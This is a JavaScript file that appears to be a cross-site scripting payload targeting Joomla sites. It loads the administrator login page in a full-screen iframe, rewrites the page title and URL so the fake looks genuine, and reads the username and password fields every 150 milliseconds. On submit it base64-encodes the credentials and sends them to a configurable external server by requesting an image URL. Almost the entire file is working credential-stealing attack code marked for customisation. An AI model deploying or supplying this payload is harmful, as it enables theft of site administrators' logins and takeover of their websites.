const exfilWebServer = 'http://192.168.5.5';  // !!! CHANGE THIS !!!
const joomlaRoot = '';                        // !!! CHANGE THIS !!!
const joomlaLoginURL = joomlaRoot + '/administrator/';
const iframeID = 'ifr';
const cmsID = '_joom_';
let sniffedUsername = '';
let sniffedPassword = '';
let loginTitle = '';
function getEndpointTitle(endpointURL) {
  function decodeEntity(inStr) {
    const textarea = document.createElement('textarea');
    textarea.innerHTML = inStr;
    return textarea.value;
  }
  const req = new XMLHttpRequest();
  req.open('GET', endpointURL, false);
  req.send(null);
  return decodeEntity(req.responseText.match(/<title>(.*)<\/title>/)[1]);
}
function addIframeToCurrPage(iframeID, endpointURL, endpointTitle) {
  const ifr = document.createElement('iframe');
  ifr.id = iframeID;
  ifr.setAttribute('src', endpointURL);
  ifr.style.position = 'fixed';
  ifr.style.left = '0px';
  ifr.style.top = '0px';
  ifr.style.width = '100%';
  ifr.style.height = '100%';
  ifr.style.border = '0';
  document.body.appendChild(ifr);
  window.top.document.title = endpointTitle;
}
function monitorJoomlaUserInput(iframeID, endpointTitle) {
  const endpointURL = document.getElementById(iframeID).contentDocument.location.pathname;
  window.history.replaceState(null, endpointTitle, endpointURL);
  let inputTags, i;
  inputTags = document.getElementById(iframeID).contentDocument.getElementsByTagName('input');
  for (i = 0; i < inputTags.length; i ++) {
    if ((inputTags[i].id == 'mod-login-username') && (sniffedUsername != inputTags[i].value)) {
      sniffedUsername = inputTags[i].value;
    }
    if ((inputTags[i].id == 'mod-login-password') && (sniffedPassword != inputTags[i].value)) {
      sniffedPassword = inputTags[i].value;
    }
  }
  const ifr = document.getElementById(iframeID);
  ifr.contentDocument.body.addEventListener('submit', exfilCreds);
  function exfilCreds() {
    const exfilImage = new Image();
    exfilImage.onload = function() { image.src = this.src; };
    exfilImage.src = exfilWebServer + '/images/' + encodeURIComponent(btoa(location.host + cmsID + sniffedUsername + ':' + sniffedPassword)) + '.jpg';
  }
}
loginTitle = getEndpointTitle(joomlaLoginURL);
addIframeToCurrPage(iframeID, joomlaLoginURL, loginTitle);
setInterval(function() { monitorJoomlaUserInput(iframeID, loginTitle); }, 150);
